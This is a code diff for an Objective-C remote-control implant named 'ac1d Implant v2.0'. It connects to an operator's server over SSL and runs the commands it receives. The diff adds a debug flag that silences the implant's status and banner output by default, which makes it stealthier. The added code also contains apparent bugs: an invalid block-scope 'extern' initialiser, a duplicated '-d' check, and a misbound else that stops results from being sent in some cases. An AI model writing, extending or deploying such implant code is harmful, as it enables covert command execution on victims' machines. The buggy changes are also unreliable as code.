@@ -50,9 +50,21 @@ int main(int argc, const char *argv[]) {
             else if ([args[1] isEqualToString:@"-r"] || [args[1] isEqualToString:@"--remote"]) {
                 if (argc < 4) showHelpMessage();
                 else {
+                    extern BOOL debug = NO;
+                    for (int i = 0; i < [args count]; i++) {
+                        if ([args[i] isEqualToString:@"-d"] || [args[i] isEqualToString:@"-d"]) {
+                            extern BOOL debug = YES;
+                        }
+                    }
                     connectToServer(args[2], [args[3] integerValue]);
                 }
             } else if ([args[1] isEqualToString:@"-l"] || [args[1] isEqualToString:@"--local"]) {
+                extern BOOL debug = NO;
+                for (int i = 0; i < [args count]; i++) {
+                    if ([args[i] isEqualToString:@"-d"] || [args[i] isEqualToString:@"-d"]) {
+                        extern BOOL debug = YES;
+                    }
+                }
                 NSMutableArray *command_args = [NSMutableArray array];
                 for (int i = 2; i < [args count]; i++) {
                     [command_args addObject:args[i]];
@@ -74,7 +86,7 @@ void sendString(NSString *string) {
 }
 
 void interactWithServer(NSString *remoteHost, int remotePort) {
-    printf("[+] Interactive connection spawned!\n");
+    if (debug) printf("[+] Interactive connection spawned!\n");
     ac1d *ac1d_base = [[ac1d alloc] init];
     ac1d_base->client_ssl = client_ssl;
     
@@ -82,9 +94,9 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
         NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
         char *terminator = (char*)[args[0] UTF8String];
-        printf("[+] Got command from %s:%d!\n", [remoteHost UTF8String], remotePort);
-        printf("[i] Current client terminator: %s\n", terminator);
-        printf("[*] Executing %s...\n", [args[1] UTF8String]);
+        if (debug) printf("[+] Got command from %s:%d!\n", [remoteHost UTF8String], remotePort);
+        if (debug) printf("[i] Current client terminator: %s\n", terminator);
+        if (debug) printf("[*] Executing %s...\n", [args[1] UTF8String]);
         if ([commands containsObject:args[1]]) {
             NSMutableArray *command_args = [NSMutableArray array];
             for (int i = 1; i < [args count]; i++) {
@@ -92,12 +104,12 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
             }
             NSString *result = [ac1d_base sendCommand:command_args];
             if (result) {
-                if ([result isEqualToString:@""]) printf("[!] Command output empty, sending terminator instead of result.\n");
+                if ([result isEqualToString:@""]) if (debug) printf("[!] Command output empty, sending terminator instead of result.\n");
                 else sendString(result);
                 SSL_write(client_ssl, terminator, (int)strlen(terminator));
-            } else printf("[-] Failed to execute command, ac1d.dylib not found!\n");
+            } else if (debug) printf("[-] Failed to execute command, ac1d.dylib not found!\n");
         } else {
-            printf("[-] Unrecognized command!\n");
+            if (debug) printf("[-] Unrecognized command!\n");
             sendString(@"error");
             SSL_write(client_ssl, terminator, (int)strlen(terminator));
         }
@@ -106,9 +118,9 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
 }
 
 void connectToServer(NSString *remoteHost, int remotePort) {
-    printf("[i] ac1d Implant v2.0\n");
-    printf("[i] Copyright (c) 2020 Ivan Nikolsky\n");
-    printf("[*] Loading ac1d SSL handler...\n");
+    if (debug) printf("[i] ac1d Implant v2.0\n");
+    if (debug) printf("[i] Copyright (c) 2020 Ivan Nikolsky\n");
+    if (debug) printf("[*] Loading ac1d SSL handler...\n");
     SSL_load_error_strings();
     SSL_library_init();
     OpenSSL_add_all_algorithms();
@@ -117,34 +129,38 @@ void connectToServer(NSString *remoteHost, int remotePort) {
     serverAddress.sin_family = AF_INET;
     inet_aton([remoteHost UTF8String], &serverAddress.sin_addr);
     serverAddress.sin_port = htons(remotePort);
-    printf("[+] ac1d SSL handler loaded!\n");
-    printf("[*] Connecting to %s:%d...\n", [remoteHost UTF8String], remotePort);
+    if (debug) printf("[+] ac1d SSL handler loaded!\n");
+    if (debug) printf("[*] Connecting to %s:%d...\n", [remoteHost UTF8String], remotePort);
     if (connect(sockfd, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
-        printf("[-] Failed to connect!\n");
+        if (debug) printf("[-] Failed to connect!\n");
         return;
-    } else printf("[+] Successfully connected!\n");
+    } else if (debug) printf("[+] Successfully connected!\n");
     client_ssl = SSL_new(ssl_client_ctx);
     if(!client_ssl) {
-        printf("[-] Failed to get SSL client!\n");
+        if (debug) printf("[-] Failed to get SSL client!\n");
         return;
     }
     SSL_set_fd(client_ssl, sockfd);
     if(SSL_connect(client_ssl) != 1) {
-        printf("[-] Failed to handshake with SSL client!\n");
+        if (debug) printf("[-] Failed to handshake with SSL client!\n");
         return;
     }
-    printf("[*] Spawning interactive connection...\n");
+    if (debug) printf("[*] Spawning interactive connection...\n");
     interactWithServer(remoteHost, remotePort);
-    printf("[-] Connection closed!\n");
+    if (debug) printf("[-] Connection closed!\n");
 }
 
 void showHelpMessage() {
-    printf("Usage: ac1d <option> [arguments]\n");
+    printf("Usage: ac1d <option> [arguments] [flags]\n");
     printf("\n");
-    printf("  -h, --help                                Show available options.\n");
-    printf("  -v, --version                             Show ac1d version.\n");
-    printf("  -l, --local <option> [arguments]          Execute ac1d command locally.\n");
-    printf("  -r, --remote <remote_host> <remote_port>  Execute ac1d commands over TCP.\n");
+    printf("Options:\n");
+    printf("  -h, --help                                        Show available options.\n");
+    printf("  -v, --version                                     Show ac1d version.\n");
+    printf("  -l, --local <option> [arguments] [flags]          Execute ac1d command locally.\n");
+    printf("  -r, --remote <remote_host> <remote_port> [flags]  Execute ac1d commands over TCP.\n");
+    printf("\n");
+    printf("Flags:\n");
+    printf("  -d, --debug  Show debug output.\n");
 }
 
 void showVersionMessage() {
